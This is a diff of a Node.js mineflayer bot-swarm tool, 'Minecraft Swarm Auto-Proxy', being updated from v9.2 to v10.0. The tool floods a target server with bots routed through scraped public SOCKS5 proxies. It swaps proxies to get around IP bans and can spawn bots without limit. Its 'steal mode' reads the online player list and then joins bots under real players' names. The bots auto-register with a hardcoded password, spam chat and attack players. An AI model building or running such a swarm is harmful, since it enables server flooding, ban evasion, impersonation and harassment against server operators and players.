@@ -1,4 +1,4 @@
-// === MINECRAFT SWARM AUTO-PROXY v9.2 ===
+// === MINECRAFT SWARM AUTO-PROXY v10.0 ===
 // Credits: Smile B
 // GitHub: Smile-B14
 
@@ -9,7 +9,6 @@ const readline = require('readline')
 const { pathfinder, Movements, goals: { GoalFollow, GoalNearXZ } } = require('mineflayer-pathfinder')
 const { SocksProxyAgent } = require('socks-proxy-agent')
 const https = require('https')
-const blessed = require('blessed')
 
 const CFG = {
   minJoinGap: 3800,
@@ -18,8 +17,19 @@ const CFG = {
   followDistance: 2,
   hitDistance: 3.5,
   aiTick: 400,
-  authPassword: '12345',
+  authPassword: 'SmileB12459',
   chatDelay: 1500 
+}
+
+// ANSI Colors for standard terminal
+const c = {
+  reset: "\x1b[0m",
+  red: "\x1b[31m",
+  green: "\x1b[32m",
+  yellow: "\x1b[33m",
+  blue: "\x1b[34m",
+  magenta: "\x1b[35m",
+  cyan: "\x1b[36m"
 }
 
 const states = new Map()
@@ -53,164 +63,64 @@ const sleep = ms => new Promise(resolve => setTimeout(resolve, ms))
 const text = v => typeof v === 'string' ? v : JSON.stringify(v)
 
 // Global crash preventers
-process.on('uncaughtException', (err) => uiLog(`{red-fg}CRASH PREVENTED: ${err.message}{/}`))
-process.on('unhandledRejection', (err) => uiLog(`{red-fg}CRASH PREVENTED: ${err}{/}`))
+process.on('uncaughtException', (err) => log(`${c.red}CRASH PREVENTED: ${err.message}${c.reset}`))
+process.on('unhandledRejection', (err) => log(`${c.red}CRASH PREVENTED: ${err}${c.reset}`))
 
-// --- STANDARD READLINE FOR SETUP ---
-const setupRl = readline.createInterface({
+const rl = readline.createInterface({
   input: process.stdin,
   output: process.stdout
 })
-const ask = q => new Promise(resolve => setupRl.question(q, resolve))
+
+function log(msg) {
+  // Overwrite current line if typing, print log, then refresh prompt
+  readline.clearLine(process.stdout, 0)
+  readline.cursorTo(process.stdout, 0)
+  console.log(msg)
+  rl.prompt(true)
+}
+
+async function askValid(question, validator) {
+  while (true) {
+    const res = await new Promise(resolve => rl.question(question, resolve))
+    const err = validator(res.trim())
+    if (err === true) return res.trim()
+    console.log(`${c.red}Invalid input: ${err}${c.reset}`)
+  }
+}
 
 async function initialSetup() {
-  console.log('\n=== MINECRAFT SWARM AUTO-PROXY v9.2 ===')
-  console.log('Credits: Smile B\n')
+  console.log(`\n${c.cyan}=== MINECRAFT SWARM AUTO-PROXY v10.0 ===${c.reset}`)
+  console.log(`${c.magenta}Credits: Smile B${c.reset}\n`)
   
-  const stealMode = await ask('Enable Steal Player Mode initially? (y/n): ')
-  if (stealMode.trim().toLowerCase() === 'y') isStealMode = true
+  const stealMode = await askValid('Enable Steal Player Mode initially? (y/n): ', (v) => v.toLowerCase() === 'y' || v.toLowerCase() === 'n' ? true : 'Please enter y or n.')
+  if (stealMode.toLowerCase() === 'y') isStealMode = true
 
-  targetHost = (await ask('Target Server IP: ')).trim()
+  targetHost = await askValid('Target Server IP: ', (v) => v.length > 2 ? true : 'IP cannot be blank or less than 3 characters.')
   
-  const portText = (await ask('Port (blank = auto): ')).trim()
+  const portText = await askValid('Port (blank = auto): ', (v) => {
+    if (!v) return true
+    const p = Number(v)
+    if (!Number.isInteger(p) || p < 1 || p > 65535) return 'Port must be 1-65535.'
+    return true
+  })
   if (portText) targetPort = Number(portText)
   
-  const versionText = (await ask('Version (blank = auto): ')).trim()
+  const versionText = await askValid('Version (blank = auto): ', (v) => true)
   if (versionText && versionText.toLowerCase() !== 'auto') targetVersion = versionText
 
-  const countText = (await ask('How many bots to maintain? (0 = infinite spam): ')).trim()
+  const countText = await askValid('How many bots to maintain? (0 = infinite spam): ', (v) => {
+    const n = Number(v)
+    if (!Number.isInteger(n) || n < 0) return 'Must be a positive number or 0.'
+    return true
+  })
   const count = parseInt(countText || '0')
-  
-  setupRl.close()
 
-  console.log('Fetching public SOCKS5 proxies...')
+  console.log(`\n${c.cyan}Fetching public SOCKS5 proxies...${c.reset}`)
   const fetched = await fetchProxies()
   proxyPool.push(...fetched)
-  console.log(`Auto-loaded ${proxyPool.length} SOCKS5 proxies.`)
+  console.log(`${c.green}Auto-loaded ${proxyPool.length} SOCKS5 proxies.${c.reset}`)
 
   return count
-}
-
-// --- BLESSED UI SETUP ---
-let screen, header, logBox, menuBox, inputDisplay
-let inputBuffer = ''
-
-function initUI() {
-  screen = blessed.screen({
-    smartCSR: true,
-    title: 'Minecraft Swarm v9.2 | Smile B',
-    fullUnicode: true,
-    style: { fg: 'white', bg: 'black' }
-  })
-
-  header = blessed.box({
-    parent: screen,
-    top: 0, left: 0, width: '100%', height: 3,
-    border: { type: 'line' },
-    style: { border: { fg: 'cyan' }, fg: 'white', bold: true },
-    tags: true,
-    content: ' {cyan-fg}MINECRAFT SWARM v9.2{/} | {magenta-fg}Credits: Smile B{/} - Initializing...'
-  })
-
-  logBox = blessed.log({
-    parent: screen,
-    top: 3, left: 0, width: '70%', bottom: 3,
-    border: { type: 'line' },
-    style: { border: { fg: 'green' } },
-    tags: true,
-    scrollable: true,
-    alwaysScroll: true,
-    scrollbar: { ch: ' ', track: { bg: 'gray' }, style: { bg: 'cyan' } },
-    label: ' Live Logs '
-  })
-
-  menuBox = blessed.box({
-    parent: screen,
-    top: 3, right: 0, width: '30%', bottom: 3,
-    border: { type: 'line' },
-    style: { border: { fg: 'magenta' } },
-    tags: true,
-    label: ' Status & Commands '
-  })
-
-  inputDisplay = blessed.box({
-    parent: screen,
-    bottom: 0, left: 0, width: '100%', height: 3,
-    border: { type: 'line' },
-    style: { border: { fg: 'yellow' }, fg: 'white' },
-    label: ' Input (Type command & press Enter) ',
-    content: ''
-  })
-
-  // Custom keypress listener - 100% immune to double typing in Termux
-  screen.on('keypress', (ch, key) => {
-    if (key.full === 'return' || key.full === 'enter') {
-      const cmd = inputBuffer.trim()
-      inputBuffer = ''
-      inputDisplay.setContent('')
-      screen.render()
-      if (cmd) handleInput(cmd)
-    } else if (key.full === 'backspace') {
-      inputBuffer = inputBuffer.slice(0, -1)
-      inputDisplay.setContent(inputBuffer)
-      screen.render()
-    } else if (ch && !key.ctrl && !key.meta && !key.full.startsWith('C-') && !key.full.startsWith('M-')) {
-      // Prevent duplicate characters on multi-byte sequences
-      if (key.full === ch || key.full.length === 1) {
-        inputBuffer += ch
-        inputDisplay.setContent(inputBuffer)
-        screen.render()
-      }
-    }
-  })
-
-  screen.render()
-}
-
-function uiLog(msg) {
-  try {
-    if (logBox) {
-      logBox.log(msg)
-      screen.render()
-    } else {
-      console.log(msg.replace(/\{[^}]+\}/g, ''))
-    }
-  } catch (e) {
-    console.log(msg.replace(/\{[^}]+\}/g, ''))
-  }
-}
-
-function updateUI() {
-  if (!screen) return
-  let online = 0, connecting = 0
-  for (const s of states.values()) {
-    if (s.connected) online++
-    else if (s.connecting) connecting++
-  }
-  
-  header.setContent(` {cyan-fg}MINECRAFT SWARM v9.2{/} | {magenta-fg}Credits: Smile B{/} | {green-fg}Online: ${online}{/} | {yellow-fg}Connecting: ${connecting}{/} | Target: ${maintainCount === 0 ? 'INF' : maintainCount} | Dead Proxies: ${deadProxiesGlobal.size}`)
-  
-  menuBox.setContent(
-    `{cyan-fg}=== Settings ==={/}\n` +
-    ` {bold}Target:{/} ${targetHost}:${targetPort || 'auto'}\n` +
-    ` AI Movement: ${aiEnabled ? '{green-fg}ON{/}' : '{red-fg}OFF{/}'}\n` +
-    ` Attacking: ${hitEnabled ? '{green-fg}ON{/}' : '{red-fg}OFF{/}'}\n` +
-    ` Chat Logs: ${logsEnabled ? '{green-fg}ON{/}' : '{red-fg}OFF{/}'}\n` +
-    ` Infinite Spawn: ${infiniteSpawn ? '{green-fg}ON{/}' : '{red-fg}OFF{/}'}\n` +
-    ` Spam: ${spamTimer ? '{green-fg}ACTIVE{/}' : '{red-fg}OFF{/}'}\n` +
-    ` Steal Mode: ${isStealMode ? '{green-fg}ON{/}' : '{red-fg}OFF{/}'}\n` +
-    `\n{magenta-fg}=== Commands ==={/}\n` +
-    ` {bold}add <count>{/} (0 = inf)\n` +
-    ` {bold}stopjoin{/} (halts queue)\n` +
-    ` {bold}spam <ms> <msg>{/}\n` +
-    ` {bold}stopspam{/}\n` +
-    ` {bold}steal on/off{/} (toggle)\n` +
-    ` {bold}ai on/off{/}\n` +
-    ` {bold}hit on/off{/}\n` +
-    ` {bold}logs on/off{/}\n` +
-    ` {bold}quit{/}\n`
-  )
-  screen.render()
 }
 
 // --- PROXY & MINEFLAYER LOGIC ---
@@ -245,8 +155,7 @@ setInterval(async () => {
       }
     }
     if (added > 0) {
-      uiLog(`{cyan-fg}Auto-refresh: Added ${added} new proxies. Total: ${proxyPool.length}{/}`)
-      updateUI()
+      log(`${c.cyan}Auto-refresh: Added ${added} new proxies. Total: ${proxyPool.length}${c.reset}`)
     }
   } catch (e) {}
 }, 60000)
@@ -275,12 +184,15 @@ function banProxy(serverHost, proxy, reason) {
   const banned = bannedProxiesForServer.get(serverHost) || new Set()
   banned.add(proxy.proxyUrl)
   bannedProxiesForServer.set(serverHost, banned)
-  uiLog(`{red-fg}Proxy ${proxy.host}:${proxy.port} blacklisted (${reason}). Total dead: ${deadProxiesGlobal.size}{/}`)
-  updateUI()
+  log(`${c.red}Proxy ${proxy.host}:${proxy.port} blacklisted (${reason}). Total dead: ${deadProxiesGlobal.size}${c.reset}`)
 }
 
 function generateRealisticName() {
-  if (customNames.length > 0) return customNames.shift()
+  if (customNames.length > 0) {
+    const name = customNames.shift()
+    log(`${c.magenta}[Steal] Using stolen name: ${name}${c.reset}`)
+    return name
+  }
   const prefixes = ['xX', 'Itz', 'Pro', 'The', 'i', '_', 'Mr', 'Lil', 'xX_', 'The_']
   const names = ['Steve', 'Alex', 'Pixel', 'Block', 'Craft', 'Mine', 'Epic', 'God', 'Dark', 'Shadow', 'Cool', 'Smart', 'Sniper', 'Gamer', 'Noob', 'King', 'Boss', 'PvP', 'Slayer', 'Zombie', 'Creeper']
   const suffixes = ['Xx', '_Xx', 'YT', '99', '123', '_', 'Pro', 'GG', '420', '69', '777', 'x', '_']
@@ -300,7 +212,7 @@ function generateRealisticName() {
 // --- STEAL MODE ---
 async function stealPlayerNames(host, port) {
   return new Promise((resolve) => {
-    uiLog(`{magenta-fg}[Steal]{/} Connecting to ${host} to read player list...`)
+    log(`${c.magenta}[Steal] Connecting to ${host} to read player list...${c.reset}`)
     const tempName = generateRealisticName()
     const opts = { host, username: tempName, auth: 'offline', hideErrors: true }
     if (port) opts.port = port
@@ -310,22 +222,29 @@ async function stealPlayerNames(host, port) {
     catch (e) { resolve([]); return }
     
     let resolved = false
+
+    // Temp bot auto-auth so it doesn't get kicked before reading tab list
+    bot.on('messagestr', msg => {
+      if (msg.includes('/register')) bot.chat(`/register ${CFG.authPassword} ${CFG.authPassword}`)
+      if (msg.includes('/login')) bot.chat(`/login ${CFG.authPassword}`)
+    })
+
     const finish = () => {
       if (resolved) return
       resolved = true
       const players = Object.keys(bot.players || {}).filter(p => p !== tempName)
-      uiLog(`{magenta-fg}[Steal]{/} Found ${players.length} players. Disconnecting...`)
+      log(`${c.magenta}[Steal] Found ${players.length} players. Disconnecting...${c.reset}`)
       try { bot.quit() } catch {}
       resolve(players)
     }
     
-    bot.once('spawn', () => setTimeout(finish, 3000))
+    bot.once('spawn', () => setTimeout(finish, 5000)) // Wait 5s to ensure tab list loads
     bot.on('end', finish)
     bot.on('error', (err) => {
-      uiLog(`{red-fg}[Steal] Error: ${err.message}{/}`)
+      log(`${c.red}[Steal] Error: ${err.message}${c.reset}`)
       finish()
     })
-    setTimeout(finish, 10000)
+    setTimeout(finish, 15000) // Fallback 15s
   })
 }
 
@@ -360,7 +279,7 @@ function runQueue() {
   nextConnectAt = Date.now() + joinDelay
   try { connectBot(entry.state) } 
   catch (e) {
-    uiLog(`{red-fg}Queue error: ${e.message}. Retrying...{/}`)
+    log(`${c.red}Queue error: ${e.message}. Retrying...${c.reset}`)
     entry.state.proxy = getProxyForServer(targetHost)
     enqueue(entry.state, 3000, 'queue error retry')
   }
@@ -380,16 +299,18 @@ async function dropAllItems(state) {
   try {
     const bot = state.bot
     if (!bot) return
+    await sleep(1000) // Wait for inventory to load
     await bot.unequip('head').catch(() => {})
     await bot.unequip('torso').catch(() => {})
     await bot.unequip('legs').catch(() => {})
     await bot.unequip('feet').catch(() => {})
     for (const item of bot.inventory.items()) {
       await bot.tossStack(item).catch(() => {})
+      await sleep(50)
     }
     bot.setControlState('drop', true)
     setTimeout(() => bot.setControlState('drop', false), 2000)
-    uiLog(`{magenta-fg}[${state.username}] Dropping all items!{/}`)
+    log(`${c.magenta}[${state.username}] Dropping all stolen items!${c.reset}`)
   } catch (e) {}
 }
 
@@ -463,8 +384,8 @@ function handleAuth(state, raw) {
 
 function connectBot(state) {
   state.connecting = true
-  const proxyTag = state.proxy ? `{yellow-fg}[P]{/}` : `{red-fg}[D]{/}`
-  uiLog(`{cyan-fg}[${state.username}]{/} ${proxyTag} Connecting to ${targetHost}...`)
+  const proxyTag = state.proxy ? `${c.yellow}[P]${c.reset}` : `${c.red}[D]${c.reset}`
+  log(`${c.cyan}[${state.username}]${c.reset} ${proxyTag} Connecting to ${targetHost}...`)
 
   const opts = { host: targetHost, username: state.username, auth: 'offline', keepAlive: true, hideErrors: true, port: targetPort, version: targetVersion }
   if (state.proxy) {
@@ -480,7 +401,7 @@ function connectBot(state) {
   let bot
   try { bot = mineflayer.createBot(opts) }
   catch (err) {
-    uiLog(`{red-fg}[${state.username}] CREATE ERROR: ${err.message}. Retrying...{/}`)
+    log(`${c.red}[${state.username}] CREATE ERROR: ${err.message}. Retrying...${c.reset}`)
     state.connecting = false
     state.proxy = getProxyForServer(targetHost)
     return enqueue(state, 5000, 'retry')
@@ -492,46 +413,41 @@ function connectBot(state) {
   bot.once('spawn', () => {
     state.connecting = false
     state.connected = true
-    uiLog(`{green-fg}[${state.username}] JOINED.{/} Starting AI...`)
-    updateUI()
+    log(`${c.green}[${state.username}] JOINED.${c.reset} Starting AI...`)
     startAI(state)
     if (state.isStolen) dropAllItems(state)
   })
 
   bot.on('messagestr', msg => {
     handleAuth(state, msg)
-    if (logsEnabled) uiLog(`{blue-fg}[CHAT -> ${state.username}]{/} ${msg}`)
+    if (logsEnabled) log(`${c.blue}[CHAT -> ${state.username}]${c.reset} ${msg}`)
   })
 
   bot.on('kicked', reason => {
     const reasonStr = text(reason).toLowerCase()
-    uiLog(`{red-fg}[${state.username}] KICKED: ${text(reason)}{/}`)
+    log(`${c.red}[${state.username}] KICKED: ${text(reason)}${c.reset}`)
     
-    // FIXED IP BAN LOGIC
     if (reasonStr.includes('banned_ip') || reasonStr.includes('ip_banned') || reasonStr.includes('ip banned')) {
-      // It's an IP ban. Ban the proxy, but keep the bot alive with a new proxy!
-      uiLog(`{yellow-fg}[${state.username}] IP Ban detected. Swapping proxy and retrying...{/}`)
+      log(`${c.yellow}[${state.username}] IP Ban detected. Swapping proxy and retrying...${c.reset}`)
       banProxy(targetHost, state.proxy, 'IP Banned by Server')
-      state.proxy = getProxyForServer(targetHost) // Get new proxy
-      enqueue(state, 2000, 'ip ban proxy swap') // Retry same bot with new proxy
+      state.proxy = getProxyForServer(targetHost) 
+      enqueue(state, 2000, 'ip ban proxy swap') 
     } else if (reasonStr.includes('whitelist') || reasonStr.includes('not whitelisted') || reasonStr.includes('banned')) {
-      // It's an account ban or whitelist. Stop trying with this username.
-      uiLog(`{red-fg}[${state.username}] Stopping retries (Account Ban/Whitelist detected).{/}`)
+      log(`${c.red}[${state.username}] Stopping retries (Account Ban/Whitelist detected).${c.reset}`)
       state.permanentStop = true
     }
   })
 
   bot.on('error', err => {
-    uiLog(`{red-fg}[${state.username}] ERROR: ${err.message}{/}`)
+    log(`${c.red}[${state.username}] ERROR: ${err.message}${c.reset}`)
     if (state.proxy && (err.code === 'ECONNREFUSED' || err.code === 'ETIMEDOUT' || err.code === 'ECONNRESET' || err.message.includes('socks') || err.message.includes('proxy'))) {
       banProxy(targetHost, state.proxy, 'Connection Error')
     }
     
-    // Fallback Retry System: If error fires but 'end' doesn't, force requeue after 2s
     state.connecting = false
     setTimeout(() => {
       if (!state.connected && !state.queued && !state.permanentStop) {
-        uiLog(`{yellow-fg}[${state.username}] Connection stuck. Force retrying with new proxy...{/}`)
+        log(`${c.yellow}[${state.username}] Connection stuck. Force retrying with new proxy...${c.reset}`)
         state.proxy = getProxyForServer(targetHost)
         enqueue(state, 1000, 'force error retry')
       }
@@ -544,7 +460,6 @@ function connectBot(state) {
     state.connecting = false
     state.bot = null
     
-    // Only auto-requeue if it wasn't an IP ban (IP ban requeues in the 'kicked' event)
     if (!state.permanentStop && !state.queued) {
       state.proxy = getProxyForServer(targetHost)
       enqueue(state, 3000, 'retry')
@@ -552,7 +467,6 @@ function connectBot(state) {
       states.delete(state.username.toLowerCase())
       botNames.delete(state.username.toLowerCase())
     }
-    updateUI()
   })
 }
 
@@ -562,24 +476,22 @@ async function sendAll(message) {
     try { s.bot.chat(message); await sleep(CFG.chatDelay) } catch {}
   }
   if (spamTimer) {
-    uiLog(`{magenta-fg}[Spam] x${online.length} sent{/}`)
+    log(`${c.magenta}[Spam] x${online.length} sent${c.reset}`)
   } else {
-    uiLog(`{magenta-fg}Finished sending message to ${online.length} bots.{/}`)
+    log(`${c.magenta}Finished sending message to ${online.length} bots.${c.reset}`)
   }
 }
 
 function startSpam(message, interval) {
   if (spamTimer) clearInterval(spamTimer)
   spamTimer = setInterval(() => sendAll(message), interval)
-  uiLog(`{magenta-fg}Spamming EVERY ${interval}ms.{/}`)
-  updateUI()
+  log(`${c.magenta}Spamming EVERY ${interval}ms.${c.reset}`)
 }
 
 function stopSpam() {
   if (spamTimer) { 
     clearInterval(spamTimer); spamTimer = null; 
-    uiLog(`{magenta-fg}Spam stopped.{/}`) 
-    updateUI()
+    log(`${c.magenta}Spam stopped.${c.reset}`) 
   }
 }
 
@@ -587,8 +499,7 @@ function startInfiniteSpawn() {
   if (infiniteSpawn) return
   infiniteSpawn = true
   maintainCount = 0
-  uiLog(`{yellow-fg}Infinite spawn mode enabled. Generating bots continuously...{/}`)
-  updateUI()
+  log(`${c.yellow}Infinite spawn mode enabled. Generating bots continuously...${c.reset}`)
   spawnInterval = setInterval(() => {
     try {
       const name = generateRealisticName()
@@ -605,8 +516,7 @@ function startInfiniteSpawn() {
 function stopSpawn() {
   if (spawnInterval) clearInterval(spawnInterval)
   infiniteSpawn = false
-  uiLog(`{yellow-fg}Infinite spawn stopped. Existing bots will remain.{/}`)
-  updateUI()
+  log(`${c.yellow}Infinite spawn stopped. Existing bots will remain.${c.reset}`)
 }
 
 function stopJoin() {
@@ -614,8 +524,7 @@ function stopJoin() {
   infiniteSpawn = false
   maintainCount = 0
   queue.length = 0 
-  uiLog(`{yellow-fg}Queue cleared. No new bots will join. Online bots will stay.{/}`)
-  updateUI()
+  log(`${c.yellow}Queue cleared. No new bots will join. Online bots will stay.${c.reset}`)
 }
 
 function addBots(count) {
@@ -630,7 +539,7 @@ function addBots(count) {
       states.set(name.toLowerCase(), state)
       enqueue(state, 0, 'added via cmd')
     }
-    uiLog(`{cyan-fg}Generating ${count} new bots. Target total: ${maintainCount}{/}`)
+    log(`${c.cyan}Generating ${count} new bots. Target total: ${maintainCount}${c.reset}`)
   }
 }
 
@@ -643,7 +552,7 @@ setInterval(() => {
     }
     if (aliveBots < maintainCount) {
       const needed = maintainCount - aliveBots
-      uiLog(`{yellow-fg}Maintaining count: Replacing ${needed} lost bot(s).{/}`)
+      log(`${c.yellow}Maintaining count: Replacing ${needed} lost bot(s).${c.reset}`)
       for (let i = 0; i < needed; i++) {
         const name = generateRealisticName()
         botNames.add(name.toLowerCase())
@@ -658,21 +567,20 @@ setInterval(() => {
 async function toggleSteal(mode) {
   if (mode === 'on') {
     isStealMode = true
-    uiLog(`{magenta-fg}[Steal] Mode ON. Pausing queue to scan server...{/}`)
+    log(`${c.magenta}[Steal] Mode ON. Pausing queue to scan server...${c.reset}`)
     stopJoin()
     customNames = await stealPlayerNames(targetHost, targetPort)
     if (customNames.length === 0) {
-      uiLog('{red-fg}[Steal] Failed to read players. Use random names instead.{/}')
+      log(`${c.red}[Steal] Failed to read players. Use random names instead.${c.reset}`)
       isStealMode = false
     } else {
-      uiLog(`{green-fg}[Steal] Successfully stole ${customNames.length} names! Type 'add 10' to spawn them.{/}`)
+      log(`${c.green}[Steal] Successfully stole ${customNames.length} names! Type 'add 10' to spawn them.${c.reset}`)
     }
   } else {
     isStealMode = false
     customNames = []
-    uiLog(`{magenta-fg}[Steal] Mode OFF. Future bots will use random names.{/}`)
+    log(`${c.magenta}[Steal] Mode OFF. Future bots will use random names.${c.reset}`)
   }
-  updateUI()
 }
 
 function handleInput(input) {
@@ -683,15 +591,15 @@ function handleInput(input) {
 
     if (cmd === 'add') {
       const n = parseInt(rest)
-      if (isNaN(n) || n < 0) uiLog('{red-fg}Use: add <number> (0 for infinite){/}')
+      if (isNaN(n) || n < 0) log(`${c.red}Use: add <number> (0 for infinite)${c.reset}`)
       else addBots(n)
     }
     else if (cmd === 'spam') {
       const p = rest.indexOf(' ')
-      if (p < 0) uiLog('{red-fg}Use: spam <interval_ms> <message> (Example: spam 5000 Hello){/}')
+      if (p < 0) log(`${c.red}Use: spam <interval_ms> <message> (Example: spam 5000 Hello)${c.reset}`)
       else {
         const interval = parseInt(rest.slice(0, p))
-        if (isNaN(interval) || interval < 1000) uiLog('{red-fg}Interval must be a number >= 1000. Example: spam 5000 Hello{/}')
+        if (isNaN(interval) || interval < 1000) log(`${c.red}Interval must be a number >= 1000. Example: spam 5000 Hello${c.reset}`)
         else startSpam(rest.slice(p + 1).trim(), interval)
       }
     }
@@ -699,17 +607,38 @@ function handleInput(input) {
     else if (cmd === 'stopspawn') stopSpawn()
     else if (cmd === 'stopjoin') stopJoin()
     else if (cmd === 'steal') toggleSteal(rest.toLowerCase())
-    else if (cmd === 'ai') { aiEnabled = rest === 'on'; uiLog(`{yellow-fg}AI ${aiEnabled ? 'ON' : 'OFF'}{/}`); updateUI() }
-    else if (cmd === 'hit') { hitEnabled = rest === 'on'; uiLog(`{yellow-fg}Hitting ${hitEnabled ? 'ON' : 'OFF'}{/}`); updateUI() }
-    else if (cmd === 'logs') { logsEnabled = rest === 'on'; uiLog(`{yellow-fg}Logs ${logsEnabled ? 'ON' : 'OFF'}{/}`); updateUI() }
+    else if (cmd === 'ai') { aiEnabled = rest === 'on'; log(`${c.yellow}AI ${aiEnabled ? 'ON' : 'OFF'}${c.reset}`) }
+    else if (cmd === 'hit') { hitEnabled = rest === 'on'; log(`${c.yellow}Hitting ${hitEnabled ? 'ON' : 'OFF'}${c.reset}`) }
+    else if (cmd === 'logs') { logsEnabled = rest === 'on'; log(`${c.yellow}Logs ${logsEnabled ? 'ON' : 'OFF'}${c.reset}`) }
+    else if (cmd === 'help') {
+      console.log(`\n${c.cyan}=== BOT CONTROL ===${c.reset}`)
+      console.log(` list                      -> Shows how many bots are online/connecting`)
+      console.log(` add <count>               -> Spawns more bots (0 for infinite)`)
+      console.log(` stopjoin                  -> Stops ALL pending bots from joining`)
+      console.log(` spam <ms> <message>       -> Bots spam chat. Example: spam 5000 Hello!`)
+      console.log(` stopspam                  -> Stops the chat spam`)
+      console.log(` steal on/off              -> Toggles steal player mode`)
+      console.log(` ai on | ai off            -> Toggles all movement and attacking`)
+      console.log(` hit on | hit off          -> Toggles attacking players/mobs`)
+      console.log(` logs on | logs off        -> Toggles server chat logging in console`)
+      console.log(` quit                      -> Disconnects all bots and exits\n`)
+    }
+    else if (cmd === 'list') {
+      let online = 0, connecting = 0
+      for (const s of states.values()) {
+        if (s.connected) online++
+        else if (s.connecting) connecting++
+      }
+      log(`${c.cyan}Total: ${states.size} | Online: ${online} | Connecting: ${connecting} | Dead Proxies: ${deadProxiesGlobal.size} | Maintain Target: ${maintainCount === 0 ? 'INF' : maintainCount}${c.reset}`)
+    }
     else if (cmd === 'quit') {
-      uiLog('{red-fg}Disconnecting all...{/}')
+      log(`${c.red}Disconnecting all...${c.reset}`)
       for (const s of states.values()) { try { s.bot?.quit() } catch {} }
       setTimeout(() => process.exit(0), 500)
     }
-    else uiLog('{red-fg}Unknown command. See right panel for list.{/}')
+    else log(`${c.red}Unknown command. Type 'help'${c.reset}`)
   } catch (e) {
-    uiLog(`{red-fg}Command error: ${e.message}{/}`)
+    log(`${c.red}Command error: ${e.message}${c.reset}`)
   }
 }
 
@@ -717,27 +646,32 @@ async function main() {
   try {
     const initialCount = await initialSetup()
     
-    initUI()
-    
-    uiLog('{cyan-fg}=== MINECRAFT SWARM AUTO-PROXY v9.2 ==={/}')
-    uiLog('{magenta-fg}Credits: Smile B{/}')
-    uiLog(`{green-fg}Auto-loaded ${proxyPool.length} SOCKS5 proxies.{/}`)
-    uiLog('{cyan-fg}Proxies will auto-refresh every 60 seconds.{/}')
+    console.log(`\n${c.cyan}=== MINECRAFT SWARM AUTO-PROXY v10.0 ===${c.reset}`)
+    console.log(`${c.magenta}Credits: Smile B${c.reset}`)
+    console.log(`${c.green}Auto-loaded ${proxyPool.length} SOCKS5 proxies.${c.reset}`)
+    console.log(`${c.cyan}Proxies will auto-refresh every 60 seconds.${c.reset}`)
     
     if (isStealMode) {
-      uiLog('{magenta-fg}[Steal]{/} Scanning server for initial names...')
+      console.log(`${c.magenta}[Steal] Scanning server for initial names...${c.reset}`)
       customNames = await stealPlayerNames(targetHost, targetPort)
       if (customNames.length > 0) {
-        uiLog(`{green-fg}[Steal]{/} Stole ${customNames.length} names!{/}`)
+        console.log(`${c.green}[Steal] Stole ${customNames.length} names!${c.reset}`)
       } else {
-        uiLog('{red-fg}[Steal] Failed. Using random names.{/}')
+        console.log(`${c.red}[Steal] Failed. Using random names.${c.reset}`)
         isStealMode = false
       }
     }
     
     addBots(initialCount) 
-    uiLog(`{green-fg}Setup complete! Type commands in the input box below.{/}`)
-    updateUI()
+    console.log(`${c.green}Setup complete! Type 'help' to see commands.\n${c.reset}`)
+    
+    rl.setPrompt('BOT > ')
+    rl.prompt()
+    rl.on('line', (input) => {
+      handleInput(input.trim())
+      rl.prompt()
+    })
+    
   } catch (err) {
     console.error('Fatal startup error:', err)
     process.exit(1)
